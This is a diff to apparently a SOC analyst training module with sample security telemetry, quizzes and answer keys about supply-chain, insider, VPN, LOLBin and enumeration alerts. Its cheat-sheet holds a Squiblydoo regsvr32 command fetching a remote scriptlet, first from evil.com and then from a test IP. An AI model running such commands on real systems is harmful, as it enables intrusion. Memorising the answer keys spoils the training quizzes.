@@ -28,13 +28,12 @@ const supplyChainEvent: TelemetryEvent = {
     url: "http://203.0.113.47/stage2.ps1",
   },
   raw: {
-    "crowdstrike.event_simpleName": "ProcessRollup2",
+    "crowdstrike.event_simpleName": "DetectionSummaryEvent",
     "crowdstrike.Tactic": "Initial Access",
     "threat.tactic.id": "TA0001",
     "threat.technique.id": "T1195",
-
     "threat.technique.subtechnique.id": "T1195.001",
-    "crowdstrike.Severity": "High",
+    "crowdstrike.SeverityName": "High",
     "crowdstrike.PatternDispositionDescription": "Detection, standard detection.",
     "crowdstrike.FileName": "node.exe",
     "crowdstrike.ProcessId": "8821",
@@ -46,13 +45,6 @@ const supplyChainEvent: TelemetryEvent = {
     "crowdstrike.ParentCommandLine": "node.exe \"C:\\Program Files\\nodejs\\node_modules\\npm\\bin\\npm-cli.js\" install internal-logging-utils",
     "crowdstrike.UserName": "NEXACORP\\d.wong",
     "crowdstrike.ComputerName": "LT-DEV-0212",
-    "process.code_signature.exists": true,
-    "process.code_signature.trusted": true,
-    "npm.package_name": "internal-logging-utils",
-    "npm.package_version": "1.0.4",
-    "npm.registry": "https://registry.npmjs.org",
-    "npm.scripts.postinstall": "node ./scripts/setup.js",
-    "action_result": "detected",
   },
 };
 
@@ -75,7 +67,7 @@ const oauthConsentEvent: TelemetryEvent = {
     "data.office365.UserId": "r.patel@nexacorp.com",
     "data.office365.AzureActiveDirectoryEventType": "ApplicationManagement",
     "data.office365.ResultStatus": "Success",
-    "data.office365.ActorIpAddress": "94.102.61.10",
+    "data.office365.ActorIpAddress": "198.51.100.161",
     "data.office365.ApplicationId": "3f7a9c1e-88bb-4a2f-9e11-6d0a7e5b2c31",
     "data.office365.ApplicationDisplayName": "Quick Doc Viewer",
     "data.office365.ExtendedProperties.Name": "RequestedScopes",
@@ -136,27 +128,23 @@ const lowAndSlowEvent: TelemetryEvent = {
   severity: "low",
   hostname: "LT-FIN-1187",
   user_email: "m.reyes@nexacorp.com",
-  description: "User downloaded 14 files from the Contracts SharePoint library",
+  description: "FileDownloaded from the Contracts SharePoint library by m.reyes",
   raw: {
+    "data.office365.CreationTime": "2024-07-22T16:41:00",
+    "data.office365.Id": "c2e1b7a4-5f38-4d90-8a6e-1b3f7d2c9e40",
     "data.office365.Operation": "FileDownloaded",
+    "data.office365.RecordType": "6",
     "data.office365.Workload": "SharePoint",
     "data.office365.UserId": "m.reyes@nexacorp.com",
-    "data.office365.ClientIP": "10.20.4.61",
-    "data.office365.SiteUrl": "https://nexacorp.sharepoint.com/sites/Contracts",
-    "data.office365.SourceFileName": "Vendor-Agreement-Q3-0142.pdf",
+    "data.office365.UserType": "0",
+    "data.office365.ClientIP": "192.0.2.150",
+    "data.office365.UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
+    "data.office365.ObjectId": "https://nexacorp.sharepoint.com/sites/Contracts/Shared Documents/Active/Vendor-Agreement-Q3-0142.pdf",
+    "data.office365.SiteUrl": "https://nexacorp.sharepoint.com/sites/Contracts/",
     "data.office365.SourceRelativeUrl": "Shared Documents/Active",
-    "data.office365.ItemCount": 14,
-    "data.office365.ResultStatus": "Succeeded",
-    "dlp.policy_evaluated": "Financial Data: Bulk Download Block",
-    "dlp.threshold_files_per_hour": 50,
-    "dlp.observed_files_this_hour": 14,
-    "dlp.rule_triggered": false,
-    "ueba.baseline_daily_downloads": "2-3",
-    "ueba.consecutive_days_elevated": 17,
-    "ueba.cumulative_files_30d": 238,
-    "ueba.library_role_relevance": "LOW",
-    "user.department": "Finance",
-    "action_result": "allowed",
+    "data.office365.SourceFileName": "Vendor-Agreement-Q3-0142.pdf",
+    "data.office365.SourceFileExtension": "pdf",
+    "data.office365.ItemType": "File",
   },
 };
 
@@ -173,7 +161,9 @@ const impossibleTravelFPEvent: TelemetryEvent = {
   src_ip: "198.51.100.20",
   description: "Successful login for k.oconnell from a Dublin IP address, eleven minutes after a login from a Chicago IP address",
   raw: {
+    "okta.published": "2024-10-11T09:03:52.000Z",
     "okta.eventType": "user.session.start",
+    "okta.displayMessage": "User login to Okta",
     "okta.outcome.result": "SUCCESS",
     "okta.authenticationContext.authenticationStep": "0",
     "okta.authenticationContext.credentialProvider": "OKTA_CREDENTIAL_PROVIDER",
@@ -181,18 +171,13 @@ const impossibleTravelFPEvent: TelemetryEvent = {
     "okta.client.geographicalContext.country": "Ireland",
     "okta.client.geographicalContext.city": "Dublin",
     "okta.actor.displayName": "Kevin O'Connell",
-    "okta.actor.id": "00u3f7a9c1e88bb4a2f",
+    "okta.actor.alternateId": "k.oconnell@nexacorp.com",
+    "okta.actor.id": "00u3f7a9c1e88bb4a2f7",
     "okta.actor.type": "User",
-    "okta.securityContext.isProxy": "true",
-    "okta.securityContext.asNumber": "AS64500",
+    "okta.securityContext.isProxy": false,
+    "okta.securityContext.asNumber": "64500",
     "okta.securityContext.asOrg": "NexaCorp Ltd - Corporate VPN Egress EMEA",
-    "okta.previousLogin.ipAddress": "172.56.22.104",
-    "okta.previousLogin.city": "Chicago",
-    "okta.previousLogin.country": "United States",
-    "okta.previousLogin.minutesAgo": 11,
-    "network.vpn_client": "GlobalProtect",
-    "network.vpn_gateway_pool": "nexacorp-vpn-emea-dublin-01",
-    "action_result": "success",
+    "okta.securityContext.isp": "NexaCorp Ltd",
   },
 };
 
@@ -219,24 +204,21 @@ const lolbinEvent: TelemetryEvent = {
     integrity: "high",
   },
   raw: {
-    "mde.ActionType": "ProcessCreated",
-    "mde.DetectionSource": "EDR",
-    "mde.SHA256": "aa91de90174ee849a30e905e45c836d3f51f143843130fedb36bb4f5dad4ec77",
-    "process.name": "regsvr32.exe",
-    "process.pid": "4420",
-    "process.command_line": "regsvr32.exe /s C:\\AppDeploy\\ReportEngine\\ReportViewerCtl.dll",
-    "process.parent.name": "cmd.exe",
-    "process.parent.pid": "3312",
-    "process.parent.command_line": "cmd.exe /c deploy_report_engine.bat",
-    "user.name": "NEXACORP\\t.mendes",
-    "host.name": "SRV-APP-0044",
-    "process.code_signature.exists": true, "process.code_signature.trusted": true,
-    "file.publisher": "NexaCorp Internal Engineering",
-    "network.connection_made": "false",
-    "change_management.ticket_id": "CHG0041823",
-    "change_management.scheduled_window": "2024-11-05T20:00:00Z to 2024-11-05T22:00:00Z",
-    "change_management.actual_time": "2024-11-05T19:55:03Z",
-    "action_result": "allowed",
+    Timestamp: "2024-11-05T19:55:03.0000000Z",
+    DeviceId: "e83c19a4b7f20d5612a9c4e7f0b3d8a15c6e2f90",
+    DeviceName: "srv-app-0044.nexacorp.com",
+    ActionType: "ProcessCreated",
+    FileName: "regsvr32.exe",
+    FolderPath: "C:\\Windows\\System32\\regsvr32.exe",
+    SHA256: "aa91de90174ee849a30e905e45c836d3f51f143843130fedb36bb4f5dad4ec77",
+    ProcessId: 4420,
+    ProcessCommandLine: "regsvr32.exe /s C:\\AppDeploy\\ReportEngine\\ReportViewerCtl.dll",
+    AccountDomain: "nexacorp",
+    AccountName: "t.mendes",
+    InitiatingProcessFileName: "cmd.exe",
+    InitiatingProcessId: 3312,
+    InitiatingProcessCommandLine: "cmd.exe /c deploy_report_engine.bat",
+    ReportId: 22871,
   },
 };
 
@@ -248,7 +230,7 @@ const passwordResetAbuseEvent: TelemetryEvent = {
   vendor: "Cloudflare WAF",
   event_type: "http_request",
   severity: "medium",
-  src_ip: "45.142.212.61",
+  src_ip: "198.51.100.212",
   description: "Burst of POST requests to the password-reset endpoint from one source IP, all answered with HTTP 200",
   mitre_technique: "T1589.002",
   mitre_tactic: "Reconnaissance",
@@ -258,23 +240,24 @@ const passwordResetAbuseEvent: TelemetryEvent = {
     status: 200,
   },
   raw: {
-    "http.request.method": "POST",
-    "http.request.uri.path": "/api/v1/auth/forgot-password",
-    "http.response.status_code": "200",
-    "http.request.headers.user_agent": "python-requests/2.31.0",
-    "client.ip": "45.142.212.61",
-    "client.geo.country": "Ukraine",
-    "client.geo.city": "Kyiv",
-    "cf.threat_score": "18",
-    "cf.bot_management.score": "4",
-    "cf.bot_management.verified_bot": "false",
-    "waf.rule_triggered": "none",
-    "waf.rate_limit_threshold_per_min": 100,
-    "waf.observed_requests_per_min": 42,
-    "app.response_time_variance_ms": "user_exists=812ms avg, user_not_exists=94ms avg",
-    "app.emails_attempted_last_hour": 212,
-    "app.unique_emails_attempted": 212,
-    "action_result": "allowed",
+    EdgeStartTimestamp: "2024-12-02T03:14:27Z",
+    RayID: "8ec4b1a7f9d23c51",
+    ClientIP: "198.51.100.212",
+    ClientCountry: "ua",
+    ClientASN: 64511,
+    ClientRequestHost: "app.nexacorp.com",
+    ClientRequestMethod: "POST",
+    ClientRequestPath: "/api/v1/auth/forgot-password",
+    ClientRequestUserAgent: "python-requests/2.31.0",
+    EdgeResponseStatus: 200,
+    OriginResponseStatus: 200,
+    OriginResponseDurationMs: 806,
+    BotScore: 4,
+    BotScoreSrc: "Heuristics",
+    VerifiedBotCategory: "",
+    WAFAttackScore: 86,
+    SecurityAction: "",
+    SecurityRuleID: "",
   },
 };
 
@@ -356,7 +339,7 @@ const edgeCaseRoom = {
       id: "edge-la1",
       heading: "CrowdStrike Falcon: A Postinstall Script That Isn't What It Claims to Be",
       context:
-        "A developer, d.wong, ran 'npm install internal-logging-utils' on their laptop while pulling in a new dependency for an internal tool. CrowdStrike Falcon raised a High-severity detection a few seconds later. At first glance this looks like routine developer tooling noise: npm spawning node.exe happens constantly across your fleet. Look carefully at every field before deciding whether this is routine.",
+        "A developer, d.wong, ran 'npm install internal-logging-utils' on their laptop while pulling in a new dependency for an internal tool. CrowdStrike Falcon raised a High-severity detection a few seconds later. At first glance this looks like routine developer tooling noise: npm spawning node.exe happens constantly across your fleet.\n\n**What the npm install log on the laptop adds:** internal-logging-utils resolved from https://registry.npmjs.org at version 1.0.4, and its package.json declares the postinstall script 'node ./scripts/setup.js'.\n\nLook carefully at every field before deciding whether this is routine.",
       event: supplyChainEvent,
       questions: [
         {
@@ -370,12 +353,12 @@ const edgeCaseRoom = {
           ],
           answer: 1,
           explanation:
-            "The package declares its postinstall as 'node ./scripts/setup.js' (npm.scripts.postinstall), but the process that actually ran is inline code that calls child_process.exec to launch hidden PowerShell and download-and-execute a script from a raw IP. The tell is the chain and the mismatch with what the package declares, not the use of node or of -e as such. “process.code_signature.trusted is true” only says node.exe is the genuine signed runtime; the malicious logic is in the arguments it was given, not in a modified binary. “Detection, standard detection.” means Falcon detected and did not block. It is not a benign verdict. “The parent is node.exe running npm-cli.js” is the normal lineage for an install script, which is exactly why this attack blends in.",
+            "The package declares its postinstall as 'node ./scripts/setup.js' (package.json, per the install log), but the process that actually ran is inline code that calls child_process.exec to launch hidden PowerShell and download-and-execute a script from a raw IP. The tell is the chain and the mismatch with what the package declares, not the use of node or of -e as such. “process.code_signature.trusted is true” only says node.exe is the genuine signed runtime; the malicious logic is in the arguments it was given, not in a modified binary. “Detection, standard detection.” means Falcon detected and did not block. It is not a benign verdict. “The parent is node.exe running npm-cli.js” is the normal lineage for an install script, which is exactly why this attack blends in.",
           xp: 25,
         },
         {
           question:
-            "Your internal registry serves internal-logging-utils at version 0.9.2. Compare that with the npm.registry and npm.package_version fields in this record. What does the combination point to?",
+            "Your internal registry serves internal-logging-utils at version 0.9.2. Compare that with the registry and version in the npm install log. What does the combination point to?",
           options: [
             "Typosquatting: the name is a near-miss of a popular public package that the developer mistyped",
             "Dependency confusion: a same-named, higher-versioned public package beat the internal one",
@@ -440,12 +423,12 @@ const edgeCaseRoom = {
       id: "edge-la3",
       heading: "SharePoint + UEBA: Fourteen Files a Day, Seventeen Days Running",
       context:
-        "A single SharePoint FileDownloaded event for m.reyes shows 14 files pulled from the Contracts library. Your DLP policy's bulk-download threshold is 50 files per hour, so no rule fired and the event sits at low severity in the queue. A UEBA layer sitting on top of the same event stream has been quietly building a very different picture. Compare what each layer sees.",
+        "m.reyes downloaded 14 files from the SharePoint Contracts library in the last hour; one of those FileDownloaded audit records is shown below. Your DLP policy 'Financial Data: Bulk Download Block' evaluated the activity: its bulk-download threshold is 50 files per hour, 14 were observed, so no rule fired and the event sits at low severity in the queue.\n\n**What the UEBA layer on the same event stream shows for m.reyes (Finance):** baseline 2-3 downloads a day; 17 consecutive days elevated; 238 files in 30 days; relevance of the Contracts library to this user's role: LOW.\n\nCompare what each layer sees.",
       event: lowAndSlowEvent,
       questions: [
         {
           question:
-            "The dlp.rule_triggered field is false and dlp.observed_files_this_hour (14) is far below dlp.threshold_files_per_hour (50). Why is it a mistake to close this alert as benign based on the DLP fields alone?",
+            "The DLP policy did not trigger: 14 files observed this hour, far below its threshold of 50 per hour. Why is it a mistake to close this alert as benign based on the DLP fields alone?",
           options: [
             "It is not a mistake: 14 of a 50-file limit is under 30% of the threshold, well inside normal daily use",
             "DLP judges one hour at a time, so it cannot see 17 sub-threshold days in a row: the insider pattern here",
@@ -454,12 +437,12 @@ const edgeCaseRoom = {
           ],
           answer: 1,
           explanation:
-            "DLP thresholds are a per-hour circuit breaker built to stop bulk exports; they cannot see a pattern spread across many days where each session stays under the line. The threshold not firing tells you this was not a smash-and-grab. It tells you nothing about 17 consecutive elevated days. “14 of a 50-file limit … well inside normal daily use” judges against the policy, not the person: this user's own baseline is 2-3 files a day. “Lowering it to 10 files per hour” is the fix the reading rejects: it just moves the goalpost, adds false positives, and a patient insider adjusts. “The policy never evaluated the event” misreads the record: dlp.policy_evaluated names the policy that ran; rule_triggered false means it ran and the count stayed under the threshold.",
+            "DLP thresholds are a per-hour circuit breaker built to stop bulk exports; they cannot see a pattern spread across many days where each session stays under the line. The threshold not firing tells you this was not a smash-and-grab. It tells you nothing about 17 consecutive elevated days. “14 of a 50-file limit … well inside normal daily use” judges against the policy, not the person: this user's own baseline is 2-3 files a day. “Lowering it to 10 files per hour” is the fix the reading rejects: it just moves the goalpost, adds false positives, and a patient insider adjusts. “The policy never evaluated the event” misreads the DLP result: the policy did run, and not triggering means the count stayed under the threshold.",
           xp: 25,
         },
         {
           question:
-            "The ueba.consecutive_days_elevated field shows 17, and ueba.library_role_relevance is marked LOW for this Finance-department user accessing the Contracts library. What is the correct analyst action given these two fields together?",
+            "The UEBA layer shows 17 consecutive elevated days, and rates the Contracts library's relevance to this Finance-department user's role as LOW. What is the correct analyst action given these two fields together?",
           options: [
             "Disable the account now: 17 elevated days in a row is enough to treat this as confirmed data theft",
             "Escalate: check what was taken and where it went, and bring in the manager and HR per the playbook",
@@ -647,7 +630,7 @@ const edgeCaseRoom = {
         "LOLBIN: SAME COMMAND, TWO COMPLETELY DIFFERENT STORIES\n" +
         "=============================================================\n" +
         "  MALICIOUS (Squiblydoo):\n" +
-        "    regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll\n" +
+        "    regsvr32 /s /n /u /i:http://198.51.100.9/payload.sct scrobj.dll\n" +
         "    --> outbound network connection follows immediately\n" +
         "    --> DLL/script is remote, unsigned, never seen before\n\n" +
         "  LEGITIMATE (admin deployment):\n" +
@@ -664,8 +647,8 @@ const edgeCaseRoom = {
         "  VPN FALSE POSITIVE:\n" +
         "    Login 1: Chicago, residential/mobile ASN\n" +
         "    Login 2 (11 min later): Dublin, AS64500 (NexaCorp's own registered ASN)\n" +
-        "    is_proxy: TRUE | as_org: 'NexaCorp Ltd - Corporate VPN Egress EMEA'\n" +
-        "    network.vpn_gateway_pool: nexacorp-vpn-emea-dublin-01  <-- THE TELL\n\n" +
+        "    is_proxy: false | as_org: 'NexaCorp Ltd - Corporate VPN Egress EMEA'\n" +
+        "    VPN gateway log: pool nexacorp-vpn-emea-dublin-01  <-- THE TELL\n\n" +
         "BUSINESS LOGIC: PASSWORD RESET ENUMERATION\n" +
         "=============================================================\n" +
         "  212 sequential POSTs to /forgot-password, 212 unique emails\n" +
@@ -693,11 +676,11 @@ const edgeCaseRoom = {
       id: "edge-ac3",
       heading: "Verdict: Squiblydoo Attack or Legitimate Admin Deployment?",
       scenario:
-        "EDR fires a medium-severity alert on SRV-APP-0044: regsvr32.exe registered a DLL outside the scheduled maintenance window. The technique maps to T1218.010 (System Binary Proxy Execution: Regsvr32), a documented Stealth technique (the tactic formerly called Defense Evasion). regsvr32 is a well-known LOLBin used in the Squiblydoo attack chain. Before escalating this as an intrusion, review every field in the event, not just the alert title.",
+        "EDR fires a medium-severity alert on SRV-APP-0044: regsvr32.exe registered a DLL outside the scheduled maintenance window. The technique maps to T1218.010 (System Binary Proxy Execution: Regsvr32), a documented Stealth technique (the tactic formerly called Defense Evasion). regsvr32 is a well-known LOLBin used in the Squiblydoo attack chain. Three lookups are already done: change ticket CHG0041823 (deploy ReportEngine on SRV-APP-0044) has the approved window 2024-11-05 20:00:00 to 22:00:00 UTC; the DLL is signed by 'NexaCorp Internal Engineering'; and a DeviceNetworkEvents query for this regsvr32 process returns no connections. Before escalating this as an intrusion, review every field in the event, not just the alert title.",
       event: lolbinEvent,
       correct_verdict: "benign_true_positive",
       explanation:
-        "This is a benign true positive: legitimate administrative work, not Squiblydoo abuse. The detection fired correctly on a real regsvr32 DLL registration; what makes it benign is the authorization behind it. The command line registers a local file path (C:\\AppDeploy\\ReportEngine\\ReportViewerCtl.dll), not a remote scriptlet fetched over the network, and network.connection_made is false, meaning no outbound call followed execution at all, which is the single clearest technical distinction between real regsvr32/scrobj.dll abuse and routine local DLL registration. The file is signed, with file.publisher showing 'NexaCorp Internal Engineering': an internal, known publisher, not an unsigned or externally-sourced binary. The process was launched from a batch script (deploy_report_engine.bat) under an open change-management ticket, CHG0041823, and comparing change_management.actual_time (19:55:03Z) with the start of change_management.scheduled_window (20:00Z) shows the command ran only about 5 minutes before its approved window opened, so it was technically outside the window, as the alert says, but by an administrator starting slightly early under a matching open ticket: a process deviation, not evidence of an intrusion. Every one of these facts is independently checkable in the raw event; none of them require trusting the analyst's gut. The correct action is to close this as a benign true positive citing change ticket CHG0041823 (not as a false positive: the rule did not misfire, and labelling it one invites weakening a LOLBin detection that works), but log the 5-minute early-start deviation back to the change-management process as a minor process note, since consistently starting outside approved windows is worth flagging to the change board even when the activity itself is benign.",
+        "This is a benign true positive: legitimate administrative work, not Squiblydoo abuse. The detection fired correctly on a real regsvr32 DLL registration; what makes it benign is the authorization behind it. The command line registers a local file path (C:\\AppDeploy\\ReportEngine\\ReportViewerCtl.dll), not a remote scriptlet fetched over the network, and the DeviceNetworkEvents lookup returned nothing, meaning no outbound call followed execution at all, which is the single clearest technical distinction between real regsvr32/scrobj.dll abuse and routine local DLL registration. The DLL is signed by 'NexaCorp Internal Engineering': an internal, known publisher, not an unsigned or externally-sourced binary. The process was launched from a batch script (deploy_report_engine.bat) under an open change-management ticket, CHG0041823, and comparing the event's Timestamp (19:55:03Z) with the start of the change window (20:00Z) shows the command ran only about 5 minutes before its approved window opened, so it was technically outside the window, as the alert says, but by an administrator starting slightly early under a matching open ticket: a process deviation, not evidence of an intrusion. Every one of these facts is independently checkable in the raw event; none of them require trusting the analyst's gut. The correct action is to close this as a benign true positive citing change ticket CHG0041823 (not as a false positive: the rule did not misfire, and labelling it one invites weakening a LOLBin detection that works), but log the 5-minute early-start deviation back to the change-management process as a minor process note, since consistently starting outside approved windows is worth flagging to the change board even when the activity itself is benign.",
       fp_trap:
         "regsvr32.exe is one of the most well-known LOLBins in the MITRE ATT&CK framework, and T1218.010 on an alert is exactly the kind of label that pushes a junior analyst straight to escalation without reading further: 'regsvr32 fired, technique matches a real attack technique, escalate now.' That instinct treats the BINARY as the signal, when the reading in this room already established that the signal is never which binary ran, it's what the binary was told to do and what happened immediately afterward. A local, signed, version-controlled DLL path with no outbound connection and a matching change ticket is the textbook legitimate use of the exact same tool attackers abuse: same binary, same MITRE technique ID, completely different intent, and the raw fields prove it without requiring any assumption.",
       xp: 30,
@@ -710,7 +693,7 @@ const edgeCaseRoom = {
       prompt:
         "Look at the LOLBin regsvr32 event. Exactly how many SECONDS before its approved change window opened did the DLL registration actually run? (Enter a number only.)",
       answer: "297",
-      hint: "Both times you need are in the change-management fields of the raw event; the window has a start and an end, and only one of them matters here.",
+      hint: "One time is the event's own Timestamp; the other is the change window in the scenario, which has a start and an end, and only one of them matters here.",
       xp: 25,
     },
 
@@ -720,13 +703,13 @@ const edgeCaseRoom = {
       id: "edge-ac1",
       heading: "Verdict: Chicago, Then Dublin, Eleven Minutes Apart",
       scenario:
-        "Okta fires an impossible-travel alert for k.oconnell: a successful login from Chicago is followed eleven minutes later by a successful login from Dublin, Ireland, a physically impossible trip in that timeframe. Before escalating this as a probable account takeover, review the full event, particularly the network and security-context fields.",
+        "Okta fires an impossible-travel alert for k.oconnell: a successful login from Chicago (198.51.100.230, the previous Okta login, 11 minutes earlier) is followed by a successful login from Dublin, Ireland, a physically impossible trip in that timeframe. The GlobalProtect gateway log shows k.oconnell connected at 08:58 UTC from Chicago to the gateway pool nexacorp-vpn-emea-dublin-01. Before escalating this as a probable account takeover, review the full event, particularly the network and security-context fields.",
       event: impossibleTravelFPEvent,
       correct_verdict: "false_positive",
       explanation:
-        "This is a VPN/corporate-egress false positive, not an account takeover. The decisive fields are okta.securityContext.isProxy = true, okta.securityContext.asNumber/asOrg identifying AS64500 'NexaCorp Ltd - Corporate VPN Egress EMEA' (the organization's own registered VPN egress ASN, not a consumer VPN or an unrelated hosting provider), and network.vpn_gateway_pool explicitly naming 'nexacorp-vpn-emea-dublin-01': a company-owned VPN gateway. The user connected to the corporate VPN from Chicago, and the session was routed out through the company's EMEA gateway pool in Dublin. There is no credential compromise signal anywhere in the event. The correct action is to close this as a false positive (the rule misfired: it assumes an IP's location is where the user physically is, which a corporate VPN egress breaks, so the fix is to teach the rule the company's own egress ranges) but verify the vpn_gateway_pool value against your organization's known-good VPN infrastructure inventory once, since an attacker could theoretically spoof or ride a similar-looking commercial VPN to hide in this exact blind spot.",
+        "This is a VPN/corporate-egress false positive, not an account takeover. The decisive fields are okta.securityContext.asNumber/asOrg identifying AS64500 'NexaCorp Ltd - Corporate VPN Egress EMEA' (the organization's own registered VPN egress ASN, not a consumer VPN or an unrelated hosting provider), and the GlobalProtect log naming the gateway pool 'nexacorp-vpn-emea-dublin-01': a company-owned VPN gateway. The user connected to the corporate VPN from Chicago, and the session was routed out through the company's EMEA gateway pool in Dublin. There is no credential compromise signal anywhere in the event. The correct action is to close this as a false positive (the rule misfired: it assumes an IP's location is where the user physically is, which a corporate VPN egress breaks, so the fix is to teach the rule the company's own egress ranges) but verify the vpn_gateway_pool value against your organization's known-good VPN infrastructure inventory once, since an attacker could theoretically spoof or ride a similar-looking commercial VPN to hide in this exact blind spot.",
       fp_trap:
-        "The alert title says 'impossible travel' and the raw geography genuinely IS impossible for a human traveler. It is tempting to treat the word 'impossible' as inherently high-severity and escalate immediately. But impossible travel detections were built before centralized VPN/SASE egress was common, and they systematically misfire whenever an organization routes remote traffic through geographically distant egress points. Always check is_proxy and the ASN/org name behind the IP before trusting the geography at face value: the raw distance-over-time math is only meaningful if both IPs represent the user's true physical location.",
+        "The alert title says 'impossible travel' and the raw geography genuinely IS impossible for a human traveler. It is tempting to treat the word 'impossible' as inherently high-severity and escalate immediately. But impossible travel detections were built before centralized VPN/SASE egress was common, and they systematically misfire whenever an organization routes remote traffic through geographically distant egress points. Always check the ASN/org name behind the IP (and isProxy, which flags anonymizing proxies) before trusting the geography at face value: the raw distance-over-time math is only meaningful if both IPs represent the user's true physical location.",
       xp: 30,
     },
 
@@ -754,11 +737,11 @@ const edgeCaseRoom = {
       id: "edge-ac4",
       heading: "Verdict: Routine Password-Reset Traffic or Directory Enumeration?",
       scenario:
-        "Cloudflare WAF logged 212 requests to the password-reset endpoint from a single source IP over a short window. cf.threat_score is a low 18, waf.rule_triggered is none, waf.observed_requests_per_min (42) sits well under the configured rate_limit_threshold_per_min (100), and every single request returned HTTP 200. Nothing here tripped a signature, and the traffic never exceeded the rate limit. Decide whether this deserves escalation.",
+        "Cloudflare logged 212 requests to the password-reset endpoint from a single source IP over a short window; one of them is shown below (Logpush http_requests). Security Analytics adds the picture across the batch: no WAF managed rule matched, the rate-limiting rule (100 requests/min) never fired because the source peaked at 42 requests/min, every request returned HTTP 200, 212 distinct email addresses were submitted, and origin timing splits in two: requests for registered emails average 812 ms, unregistered ones 94 ms. Nothing here tripped a signature, and the traffic never exceeded the rate limit. Decide whether this deserves escalation.",
       event: passwordResetAbuseEvent,
       correct_verdict: "true_positive",
       explanation:
-        "This is a true positive: a business-logic account-enumeration attack (T1589.002) that was specifically engineered to stay under every threshold-based control in front of it. The tell is not in any single request, since each one is individually well-formed and returns a normal-looking 200. It is in the pattern across the batch. app.unique_emails_attempted (212) submitted sequentially from one source, combined with app.response_time_variance_ms showing user_exists averaging 812ms against user_not_exists averaging 94ms, means the response timing itself leaks which of those 212 email addresses correspond to real accounts, regardless of the HTTP status code being identical across all of them. The user-agent (python-requests/2.31.0) confirms this traffic is scripted rather than a real user's browser. The low cf.threat_score and the absence of a triggered WAF rule are exactly what this room's reading predicted: signature and rate-based defenses were never designed to see a business-logic side channel, because no individual request is malformed or rate-abusive enough to cross their thresholds. The correct action is to escalate: block the source IP, alert the application owner to add response-time normalization (e.g., always perform a dummy hash lookup even on the not-found path) and a per-source velocity limit specifically on the reset endpoint's business outcome (not just raw request count), and check whether any of the accounts the timing marks as valid (the slow, ~812 ms responses) were subsequently targeted for credential stuffing or spray.",
+        "This is a true positive: a business-logic account-enumeration attack (T1589.002) that was specifically engineered to stay under every threshold-based control in front of it. The tell is not in any single request, since each one is individually well-formed and returns a normal-looking 200. It is in the pattern across the batch. 212 distinct emails submitted sequentially from one source, combined with origin timing that averages 812 ms for registered emails against 94 ms for unregistered ones, means the response timing itself leaks which of those 212 email addresses correspond to real accounts, regardless of the HTTP status code being identical across all of them. The user-agent (python-requests/2.31.0) confirms this traffic is scripted rather than a real user's browser. The bot score of 4 passing unchallenged and the absence of a triggered WAF rule are exactly what this room's reading predicted: signature and rate-based defenses were never designed to see a business-logic side channel, because no individual request is malformed or rate-abusive enough to cross their thresholds. The correct action is to escalate: block the source IP, alert the application owner to add response-time normalization (e.g., always perform a dummy hash lookup even on the not-found path) and a per-source velocity limit specifically on the reset endpoint's business outcome (not just raw request count), and check whether any of the accounts the timing marks as valid (the slow, ~812 ms responses) were subsequently targeted for credential stuffing or spray.",
       fp_trap:
         "A low threat_score, zero WAF rule hits, and a request rate under the configured limit reads, at a glance, like a fully clean event: three separate controls all said 'nothing to see here,' which makes it tempting to close this without ever opening the app.* fields. The trap is trusting network/WAF-layer verdicts for an attack that was never a network-layer attack in the first place. This room's reading was explicit that business-logic abuse exploits an application functioning exactly as designed, so the WAF, rate limiter, and bot score can all legitimately report 'normal' while the application's own response-timing side channel is actively leaking your user directory. The only place this attack is visible is in the business-outcome fields (unique emails attempted, response-time variance), never in the WAF verdict fields.",
       xp: 30,
@@ -783,7 +766,7 @@ const edgeCaseRoom = {
         "  Insider low-and-slow: consecutive elevated days, not single session\n" +
         "  Magecart/MSP:         behavioral deviation within a trusted channel\n" +
         "  OAuth consent:        offline_access scope + publisher verification\n" +
-        "  Impossible travel:    ASN/is_proxy behind the 'impossible' IP\n" +
+        "  Impossible travel:    ASN/org behind the 'impossible' IP\n" +
         "  LOLBin:                outbound connection + file signing/versioning\n" +
         "  Business logic:        response-time variance + request velocity\n\n" +
         "  If you can't answer it, you haven't ruled out the edge case: \n" +
@@ -820,7 +803,7 @@ const edgeCaseRoom = {
         {
           id: "impossible-travel",
           left: "Impossible-travel false positive",
-          right: "The second login's IP resolves to a known corporate VPN/proxy ASN and is_proxy is true, rather than an unrelated hosting or residential ASN",
+          right: "The second login's IP resolves to the company's own VPN egress ASN (asOrg names NexaCorp's VPN egress), rather than an unrelated hosting or residential ASN",
         },
         {
           id: "lolbin",
